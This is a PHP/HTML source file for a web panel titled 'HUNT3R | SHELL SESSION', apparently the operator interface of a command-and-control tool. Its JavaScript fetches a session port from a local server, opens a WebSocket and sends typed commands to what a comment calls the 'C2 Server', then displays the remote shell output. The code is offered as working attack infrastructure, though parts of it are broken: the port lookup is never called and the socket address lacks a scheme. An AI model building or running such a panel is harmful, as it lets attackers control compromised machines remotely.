<?php
$sid = $_GET['sid'];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/styles.css">   
    <link rel="stylesheet" href="/css/log_styles.css">
    <link rel="stylesheet" href="/css/shell_styles.css"> 
    <title>HUNT3R | SHELL SESSION</title>
</head>


<body>
    <div class="right-pane">
    	<h3>XSHELL</h3>
    	<div class="shellbody">
            <div class="shell" id="shell-output">
            	<!-- SHELL OUTPUT IS LOADING HERE -->
            </div>
            <div class="input">
            	<input type="text" id="command-input" placeholder="Enter your command">
            	<button id="execute-button">Execute</button>
            </div>
        </div>
	<script>
    	    function extractSID() { // Extract SID
    	      const url = window.location.href;
    	      const regex = /sid=(\d+)/; 
    	      const match = url.match(regex);
     	      return match ? match[1] : null; // Return -> NULL / SID (SID = XID)
    	    }

    	    function getPort() { // AJAX Request To Receive Web Shell Session Port
    	      const sid = extractSID();
     	      if (!sid) {
     	        console.error('SID Not Found.');
     	        return;
     	      } 

       	      const xhr = new XMLHttpRequest();
      	      xhr.open('GET', `http://localhost:4444//xSLIENTx/${sid}`); // Change IP + Port
     	      xhr.onreadystatechange = function () {
              if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                  const port = parseInt(xhr.responseText);
                  startWebSocket(port);
                } else {
                  console.error('Failed To Get Port.');
                }
       	      }
            };
            xhr.send();
            }

            function startWebSocket(port) { // Start Web Socket 
              //const socket = new WebSocket(`ws://127.0.0.1:${port}`);
              const socket = new WebSocket('127.0.0.1:1202'); // Change IP + Port

              socket.addEventListener('open', (event) => {

                document.getElementById('execute-button').addEventListener('click', () => {
                  const commandInput = document.getElementById('command-input');
                  const command = commandInput.value;

    	          socket.send(command); // Send Command -> C2 Server

     	          commandInput.value = ''; // Empty Value
     	        });

     	        socket.addEventListener('message', (event) => { // Data Received
      	          const shellOutput = document.getElementById('shell-output');
    	          const outputLine = document.createElement('pre');
    	          outputLine.textContent = event.data;

      	          shellOutput.appendChild(outputLine); // Received Shell Output -> Output
     	        });
              });
           };
    	</script>		
    </div>
</body>